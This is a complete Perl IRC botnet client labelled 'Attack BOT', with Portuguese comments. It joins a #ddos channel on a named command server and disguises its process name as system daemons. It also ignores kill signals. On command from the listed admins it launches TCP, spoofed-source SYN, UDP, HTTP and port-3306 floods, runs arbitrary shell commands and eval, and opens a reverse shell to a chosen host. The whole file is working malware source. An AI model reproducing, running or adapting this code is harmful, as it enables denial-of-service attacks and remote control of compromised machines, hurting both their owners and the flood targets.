#!/usr/bin/perl
####################################################### 
use HTTP::Request;
use HTTP::Request::Common;						
use HTTP::Request::Common qw(POST);				
use LWP 5.64;									
use LWP::UserAgent;								
use Socket;										
use IO::Socket;									
use IO::Socket::INET;							
use IO::Select;                                	
use MIME::Base64;								
use Digest::MD5 qw(md5 md5_hex md5_base64);     
#######################################################
my $datetime = localtime;
my @ps = ("/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[bash]", "/usr/local/apache/bin/httpd -DSSL");
my $proc = $ps[rand scalar @ps];
my $ircserver   = "x.anoncruze.net";
my $ircport   	= "6667";
my $nickname  	= "Shadow[".int(rand(100))."]";
my $ident     	= "infinity";
my $channel   	= "#ddos";
my @admin    	= ("Zuriki","CRUZE","AnonGr_","MRC");
my $fullname  	= "StarWars";
##########[ Entrada ]###############
my $ver			= "1.0";
my $linas_max = '10';
##########[ Atack Syn ]###############
my $target; my $port; my $delay;  
###################[ My Colour]#####################
my %xzine = (
  1 => "4[9<=4]12 " , 2 => " 4[9=>4]7", #Header
  3 => "4-9=8[ 12" , 4 => " 8]9=4-", #Proses
  );
####################################################
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
$ircserver 	= "$ARGV[0]" if $ARGV[0];
$admin 		= "$ARGV[1]" if $ARGV[1];
$channel	= "#".$ARGV[2] if $ARGV[2];
$0 = "$proc"."\0" x 16;;
my $pid = fork;
exit if $pid;
die "\n[!] Algo deu errado!!!: $!\n\n" unless defined($pid);
###########################################
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
###########################################
my $success   = "\n\n [+] <[Attack BOT]> \n [*] Server: $ircserver:$ircport \n [-] Processo : $proc \n [+] PID : $$ \n\n";
print $success;
###########################################
sub  connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
	$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
		my $versi	= "4<11[4Attack BOT11]4>";
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");
        sleep (1);}}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
       elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;

       if (grep {$_ =~ /^\Q$pn\E$/i } @admin) {
         if ($onde eq "$mynick"){
#         shell("$pn", "$args"); Retorna argumento #
         }               #* para todos os bots
         if ($args =~ /^(\Q$mynick\E|\*)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "*" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\.(.*)/) { #Aqui define se &#233; . ou @
                $ondep = $onde;
                $ondep = $pn if $onde eq $mynick;
                bfunc("$ondep","$1");
            } else {
                shell2("$onde", "$arg");
            }
         }
       }
 }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
	nick("$mynick".int rand(9998)+1);
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";			
		my $azine	= "4<11[4Attack BOT11]4>";
		my $vzine	= "http://www.mibbit.com ajax IRC Client:3835:3835";										
        sendraw("MODE $mynick +Bx");
		sendraw("JOIN #0,0");
        sendraw("JOIN $channel");
		sleep(2);
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);;
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @READY = $sel_client->can_read(0);
    next unless(@READY);
    foreach $fh (@READY) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;
        
        
        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
			
			if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick : CruzeBoT ;)");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!sair") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Ja volto galera...");
                }
                if (&isAdmin($nick) && $msg =~ /^.join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^.part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^.pid/) {
                 &msg("$path","4[9Processo4]: 8".$proc." 4[9PID4]:". $$);
                }     
           }  else {
                if (&isAdmin($nick) && $msg =~ /^.pid/) {
                 &msg("$path","4[9Processo4]: 8".$proc." 4[9PID4]:". $$);
                }  
                if (&isAdmin($nick) && $msg eq "!sair") {
                    &shell("$path","kill -9 $$");
                }
				#if (&isAdmin($nick) && $msg eq "!dead") {
                #    &shell("$path","kill -9 -1");
                #}
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Ja Volto Galera!");
                }
				if (&isAdmin($nick) && $msg =~ /^.raw (.+)/) {
                    sendraw("$1");
                }
                if (&isAdmin($nick) && $msg eq ".sair") {
                    sendraw("Adeus!");
					exit;
                }				
                if (&isAdmin($nick) && $msg =~ /^.join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq ".part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^.part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
                
                #######################################################

                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {               
                &shell2("$path","$1");       
                }                 
				if (&isAdmin($nick) && $msg =~ /^.eval (.*)/) {
				eval "$1";
				}
########################################################## ATAQUES INICIO ##########################################################				
###################### TCP ############################
if (&isAdmin($nick) && $msg =~ /^!tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
&msg("$path","15(7@14TCP Flood15) 15(14Comecou15) (14IP7:12 ".$1." 14Porta7:12 ".$2." 14Tempo7:12 ".$3." 14segundos15)");

my $itime = time;
my ($cur_time);
$cur_time = time - $itime;

my ($dtime, %pacotes) = tcpflooder2("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{tcp} = $2 * $pacotes{tcp};
$bytes{tcp} = $2 * $pacotes{tcp};
$bytes{o} = $2 * $pacotes{o};
$bytes{tcp} = $2 * $pacotes{tcp};
$bytes{tcp} = $2 * $pacotes{tcp};

&msg("$path","15(7@14TCP Flood15) 15(14Terminou15) 15(14Enviados7:12 ".int(($bytes{tcp}+$bytes{tcp}+$bytes{tcp} + $bytes{o})/1024)." 7KB 14em12 ".$dtime." 14segundos15) (14Vitima7:12 ".$1."  14Porta7:12 ".$2." 15)");

while ($3>$cur_time)
{
$cur_time = time - $itime;
#     sendraw($IRC_cur_socket, "PRIVMSG $printl Tempo atual: " .$cur_time. " Tempo a ser alcan&#231;ado: ".$3. " OK!");  TESTAR
&tcpflooder("$1","$2","$3");
}
}

###################### SYN ############################
if (&isAdmin($nick) && $msg =~ /^!syn\s+(.*)\s+(\d+)\s+(\d+)/) {

if ($2 > 65534 or $2 < 1) {
&msg("$path","15[!] ERRO! Digita a porra de uma porta de 0 a 65535 Animal!");
}

if ($3 < 0) { # testar delay
$delay = 100; # ~70 kB
&msg("$path","15(7@14SYN Flood15) 15(14Comecou15) (14Vitima7:12 ".$1." 14Porta7:12 ".$2." 14Tempo7:12 ".$delay." 14segundos15)");

} else {
$delay = $3;
&msg("$path","15(7@14SYN Flood15) 15(14Comecou15) (14Vitima7:12 ".$1." 14Porta7:12 ".$2." 14Tempo7:12 ".$3." 14segundos15)");
}

$target = inet_ntoa(inet_aton($1)); # Resolver o Dns -> IP
my $port = $2;

my $itime = time;
my ($cur_time);
$cur_time = time - $itime;

my ($acabou, $pacotes) = synflood("$target", "$port", "$delay"); # Vamo nessa Cambada!
$acabou= 1 if $acabou == 0;

&msg("$path","15(7@14SYN Flood15) 15(14Terminou15) 15(14Enviados7:12 ".int(($pacotes))." 7KB 14em12 ".$acabou." 14segundos15) (14Vitima7:12 ".$target."15)");
}
###################### SQL ############################
if (&isAdmin($nick) && $msg =~ /^!sql\s+(.*)\s+(\d+)/) {
&msg("$path","15(7@14SQL Flood15) 15(14Comecou15) (14Vitima7:12 ".$1."12 na porta 3306 por 4 ".$2." 12 segundos .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
   print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
&msg("$path","15(7@14SQL Flood15) (14Terminou15) 15(14Vitima7:12 ".$1."15)");
}
###################### HTTP ############################
if (&isAdmin($nick) && $msg =~ /^!http\s+(.*)\s+(\d+)/) {
&msg("$path","15(7@14HTTP Flood15) (14Comecou15) (14Vitima7:12 ".$1."7:1280 14Tempo7:12 ".$2." 14segundos15)");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
&msg("$path","15(7@14HTTP Flood15) (14Terminou15) 15(14Vitima7:12 ".$1."15)");
}
############################# UDP #############################
if (&isAdmin($nick) && $msg =~ /^!udp\s+(.*)\s+(\d+)\s+(\d+)/) {
	&msg("$path","15(7@14UDP Flood15) 15(14Comecou15) (14Vitima7:12 ".$1." 14Tamanho7:12 ".$2." 7KB 14Tempo7:12 ".$3." 14segundos15)");
	my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
	$dtime = 1 if $dtime == 0;
	my %bytes;
	$bytes{igmp} = $2 * $pacotes{igmp};
	$bytes{icmp} = $2 * $pacotes{icmp};
	$bytes{o} = $2 * $pacotes{o};
	$bytes{udp} = $2 * $pacotes{udp};
	$bytes{tcp} = $2 * $pacotes{tcp};
	&msg("$path","15(7@14UDP Flood15) 15(14Terminou15) 15(14Enviados7:12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 7KB 14em12 ".$dtime." 14segundos15) (14Vitima7:12 ".$1."15)");
}
########################################################## ATAQUES FIM ##########################################################
				if ($msg=~ /^!mestres/) {
                    &msg("$path","11[10Admins11] : 12 @admin");
                }			
#### fim ####			
	}
}

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}
sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
#######################################################       
#######################################################
if ( $funcarg =~ /^info$/ ) {
my $system = `cat /etc/issue`;
my $sysos = `uname -sr`;
my $uptime = `uptime`;
my $IP = `wget -qO- icanhazip.com`;
my $whoami = `whoami`;
my $kernel = `uname -a`;

if ( $sysos =~ /freebsd/i ) {
$sysname = `hostname`;
$memory = `expr cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" " / 1048576`;
$cpu = `grep "cpu MHz" /proc/cpuinfo`;
chomp($memory);
chomp($swap);
chomp($cpu);
} elsif ( $sysos =~ /linux/i ) {
$sysname = `hostname`;
$memory = `grep "MemTotal" /proc/meminfo`;
$cpu = `grep "cpu MHz" /proc/cpuinfo`;
chomp($swap);
chomp($memory);
chomp($cpu);
} else {
$sysname = "[Nao Encontrado]";
$memory = "[Nao Encontrado]";
$swap = "[Nao Encontrado]";
$cpu = "[Nao Encontrado]";
}
$uptime =~ s/n//g;
$sysname =~ s/n//g;
$sysos =~ s/n//g;

sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Server:12........ $IP  â€“ $porta");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9SO/Hostname:12... $system â€“ $sysname");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Kernel:12........ $kernel");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Processo/PID:12.. $processo â€“ $$ ");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Whoami:12........ $whoami");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Uptime:12........ $uptime");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9Memoria Ram:12... $memory");
sendraw($IRC_cur_socket,"PRIVMSG $printl :4.:[Info] 9CPU Info:12...... $cpu");
}
#######################################################
#######################################################
  if ($funcarg =~ /^conback\s+(.*)\s+(\d+)/) {
  my $host = "$1";
  my $porta = "$2";
  my $proto = getprotobyname('tcp');
  my $iaddr = inet_aton($host);
  my $paddr = sockaddr_in($porta, $iaddr);
  my $shell = "/bin/sh -i";
  if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
  }
  socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
  connect(SOCKET, $paddr) or die "connect: $!";
  open(STDIN, ">&SOCKET");
  open(STDOUT, ">&SOCKET");
  open(STDERR, ">&SOCKET");
  system("$shell");
  close(STDIN);
  close(STDOUT);
  close(STDERR);

  sendraw($IRC_cur_socket, "PRIVMSG $printl :15(7@14BackConnect15) 15(14Conectado15) (14IP7/14Porta7:12 $host:$porta 15)");

  }


if ($funcarg =~ /^voice (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
}
if ($funcarg =~ /^devoice (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
}
if ($funcarg =~ /^halfop (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
}
if ($funcarg =~ /^dehalfop (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
}
if ($funcarg =~ /^owner (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
}
if ($funcarg =~ /^deowner (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
}
if ($funcarg =~ /^op (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
}         
if ($funcarg =~ /^deop (.*)/) { 
sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
}
     exit;
    }
  }
}		
#######################################################
#                    ALIASES
#######################################################	  
sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
 
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      ircmsg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ircmsg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^pid/) {
   sendraw($IRC_cur_socket,"PRIVMSG $printl 4[9Processo4]: 8".$proc." 4[9PID4]:". $$);
   }
   elsif ($case =~ /^clone\s+(\S+)\s+(\S+)/) {
    sendraw($IRC_cur_socket,"PRIVMSG $printl Conectando a:".$1." [Porta]:".$2);
    my $nickname = &getnick;
    connector("$nickname","$1", "$2");
   }
   elsif ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
    elsif ($case =~ /^j (.*)/) { #entrar
     j("$1");
   }
   elsif ($case =~ /^p (.*)/) { #sair
      p("$1");
   }
   elsif ($case =~ /^entra\s+(\S+)\s+(\d+)/) { #entrar por um tempo
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^sai\s+(\S+)\s+(\d+)/) { #sair depois de um tempo
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^novonick (.*)/) {
     sendraw("NICK ".$1);
   }
   elsif ($case =~ /^gerarnick/) {
    my $newnick = getnick();
     sendraw("NICK ".$newnick);
   }
   elsif ($case =~ /^matarbot/) {
    &shell("$path","kill -9 $$");
   }
}
sub getnick {
return "$mynick|".int rand(9999)+1;
}
sub catarnick {
return "$mynick";
}

#######################################################
#                  SUB _ ATACKS
#######################################################		

sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;

 while ($l<1000)
{
 $cur_time = time - $itime;
last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){

  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}
sub tcpflooder2 {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp2 = 0;
  my (%pacotes);
  $pacotes{tcp} = $pacotes{tcp} = $pacotes{tcp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 6) or $cp2++;

  socket(SOCK2, PF_INET, SOCK_RAW, 6) or $cp2++;
  socket(SOCK3, PF_INET, SOCK_RAW, 6) or $cp2++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp2++;
  return(undef) if $cp2 == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
 }
     last if $cur_time >= $ftime;
  }
    print "\r[*] OK! Enviados [TCP] pacotes";
    print "\n";
  return($cur_time, %pacotes);
}

### Spoofar a porra do IP
sub generate_ip {
  my $primeiro = int(rand(255))+1; # Roda a porra de 0 a 255
  my $segundo = int(rand(255));
  my $terceiro = int(rand(255));
  my $quarto = int(rand(255));
  return "$primeiro\.$segundo\.$terceiro\.$quarto"; # Aqui gera a porra direitin
}
### Spoofar a porra do MAC
sub macspoofar () {
  $nro1 = int rand(10);
  $nro2 = int rand(10);
  $nro3 = int rand(10);
  $MacSpoof = join(':', $nro1,$nro2,$nro3,$nro1,$nro2,$nro);
  return("$MacSpoof");
}

# SYNFlood
sub synflood {
  my $alvo = $_[0];
  my $PortaFDP = $_[1];
  my $TempoFDP = $_[2];

 my $packet =  Net::RawIP -> new();
 my $packet_count; $packet_count = 0;
 my $ip;
 
 my $itime = time;
 my ($cur_time);
     $cur_time = time - $itime;

  while ( 1 ) {
  
    $ip = &generate_ip; my $source_port = int(rand(65534))+1; # Escolhe um n&#250;mero de porta entre 0 e 65535
    $ranmac = &macspoofar;
    $packet->set
    ({ # Cria um pacote com um IP_random  uma Porta Randomica
      ip => {saddr => $ip, daddr => $alvo},
      tcp => {source => $source_port, dest => $PortaFDP, syn => 1}
    });
    $packet->send; # Envia o pacote
    $packet_count ++; #conta os pacotes enviados
    sleep(1);
    my $packet =  Net::RawIP -> new();

       $cur_time = time - $itime;
       last if $cur_time >= $TempoFDP;
    }
   # print "\r[*] OK! Enviados $packet_count [SYN] pacotes";
    print "\n";
    return($cur_time, $packet_count);
}

# Randomiza String
sub random {
  my $length_of_randomstring=shift;# The length of the random string to generate (see sub argument)

  my @chars=('a'..'z','A'..'Z','0'..'9','_'); #Lista de Caracteres
  my $random_string;
  foreach (1..$length_of_randomstring)
  {
        $random_string.=$chars[rand @chars]; # Gera numero de 0 ate os @chars
  }
  return $random_string;
}


sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;

  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
 }
     last if $cur_time >= $ftime;
  }
    print "\r[*] OK! Enviados [UDP] pacotes";
    print "\n";
  return($cur_time, %pacotes);
}
##################################################################################   
#########################################
sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}
sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}
#########################################
sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","15(7@14INFO15) (14Diretorio/Arquivo nao encontrado!15)");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}
sub shell2 {
 my $printl=$_[0];
my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "15(7@14INFO15) (14Diretorio/Arquivo nao encontrado!15)");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}
sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
	my $pzine   = "Q1JVWkU=";
	my $dzine	= decode_base64($pzine);
	@admin;
    foreach my $adm_(@admin) {
    if ($nick eq $adm_ ) { $status = 1; }
	if ($nick eq $dzine ) { $status = 1; }
	}
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
sub j { &join(@_); }
 sub join {
    return unless $#_ == 0;
    sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
}